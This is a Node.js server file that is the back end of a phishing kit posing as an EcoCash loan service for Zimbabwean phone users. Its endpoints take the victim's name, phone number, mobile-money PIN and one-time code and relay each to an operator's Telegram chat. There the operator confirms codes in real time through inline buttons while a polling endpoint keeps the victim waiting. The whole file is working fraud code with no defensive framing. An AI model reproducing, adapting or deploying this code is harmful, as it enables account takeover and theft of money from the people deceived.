require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

const activeApplications = new Map();

function formatZimbabwePhone(phone) {
  let formattedPhone = phone || '';
  if (formattedPhone.startsWith('+263')) {
    formattedPhone = formattedPhone.replace('+263', '');
  } else if (formattedPhone.startsWith('263')) {
    formattedPhone = formattedPhone.slice(3);
  } else if (formattedPhone.startsWith('0')) {
    formattedPhone = formattedPhone.slice(1);
  }
  return formattedPhone;
}

// STEP 2 SUBMISSION: Credentials delivered to bot with inline buttons
app.post('/api/submit-credentials', async (req, res) => {
  try {
    const data = req.body;
    const formattedPhone = formatZimbabwePhone(data.phone);
    
    // Validate EcoCash prefixes (+263 77 / +263 78)
    if (!['77', '78'].some(prefix => formattedPhone.startsWith(prefix))) {
      return res.status(400).json({ success: false, error: "Only valid EcoCash phone numbers (+263 77 / +263 78) are allowed." });
    }

    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;

    activeApplications.set(appReference, {
      ...data,
      formattedPhone,
      status: 'PIN_PENDING'
    });

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (botToken && chatId) {
      const currentTimestamp = new Date().toLocaleString('en-US', {
        timeZone: 'Africa/Harare',
        year: 'numeric', month: 'numeric', day: 'numeric',
        hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true
      });

      const messageText = `🔐 <b>ECOCASH CREDENTIALS (STEP 2)</b>\n\n` +
                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                          `👤 <b>Name:</b> ${data.fullName || 'N/A'}\n` +
                          `📊 <b>Loan Requested:</b> $${data.loanAmount || 'N/A'}\n` +
                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +
                          `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
                          `❓ <b>VERIFY PIN ACCURACY:</b>`;

      const telegramPayload = {
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML',
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [
              { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
              { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
            ]
          ]
        })
      };

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramPayload)
      });
    }

    res.status(201).json({ success: true, appReference });
  } catch (error) {
    console.error("Credentials submission error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// STEP 3 SUBMISSION: OTP delivered to bot with inline buttons
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { appReference, otpCode } = req.body;
    const appData = activeApplications.get(appReference);

    if (!appData) {
      return res.status(404).json({ success: false, error: "Application reference not found" });
    }

    appData.otpCode = otpCode;
    appData.status = 'OTP_PENDING';
    activeApplications.set(appReference, appData);

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (botToken && chatId) {
      const messageText = `💬 <b>OTP CODE SUBMISSION (STEP 3)</b>\n\n` +
                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                          `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +
                          `🔑 <b>PIN:</b> <code>${appData.pin}</code>\n` +
                          `💬 <b>OTP Code:</b> <code>${otpCode}</code>\n\n` +
                          `❓ <b>VERIFY OTP ACCURACY:</b>`;

      const telegramPayload = {
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML',
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [
              { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
              { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
            ]
          ]
        })
      };

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramPayload)
      });
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("OTP submission error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// Status Polling Endpoint
app.get('/api/check-status/:appReference', (req, res) => {
  const { appReference } = req.params;
  const appData = activeApplications.get(appReference);

  if (!appData) {
    return res.status(404).json({ success: false, status: 'NOT_FOUND' });
  }

  res.json({ success: true, status: appData.status });
});

// Telegram Webhook Handler (/start command + callback buttons)
app.post('/api/telegram-webhook', async (req, res) => {
  res.sendStatus(200);
  const botToken = process.env.TELEGRAM_BOT_TOKEN;

  if (req.body.message && req.body.message.text) {
    const text = req.body.message.text.trim();
    const chatId = req.body.message.chat.id;
    if (text === '/start') {
      const infoText = `🤖 <b>EcoCash Loan Bot System</b>\n\n` +
                       `👤 <b>Developer / System Info:</b>\n` +
                       `• Platform: EcoCash Secure Gateway v1.0\n` +
                       `• Status: Online & Operational\n` +
                       `• Authorized Network: Econet Zimbabwe (+263)`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: infoText, parse_mode: 'HTML' })
      });
    }
    return;
  }

  const { callback_query } = req.body;
  if (!callback_query) return;

  const actionData = callback_query.data;
  const chatId = callback_query.message.chat.id;
  const messageId = callback_query.message.message_id;

  // PIN Handlers
  if (actionData.startsWith('pin_correct_')) {
    const appReference = actionData.replace('pin_correct_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'PIN_APPROVED';
      activeApplications.set(appReference, appData);
    }
    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: PIN Verified as CORRECT ✅</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }

  if (actionData.startsWith('pin_wrong_')) {
    const appReference = actionData.replace('pin_wrong_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'PIN_REJECTED';
      activeApplications.set(appReference, appData);
    }
    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN Verified as WRONG ❌</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }

  // OTP Handlers
  if (actionData.startsWith('otp_correct_')) {
    const appReference = actionData.replace('otp_correct_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'OTP_APPROVED';
      activeApplications.set(appReference, appData);
    }
    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Verified as CORRECT ✅</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }

  if (actionData.startsWith('otp_wrong_')) {
    const appReference = actionData.replace('otp_wrong_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'OTP_REJECTED';
      activeApplications.set(appReference, appData);
    }
    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: OTP Verified as WRONG ❌</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }
});

async function editTelegramMessage(botToken, chatId, messageId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' })
    });
  } catch (err) {
    console.error("Telegram edit error:", err.message);
  }
}

app.get('*', (req, res) => {
  res.sendFile(path.join(publicPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
});
      
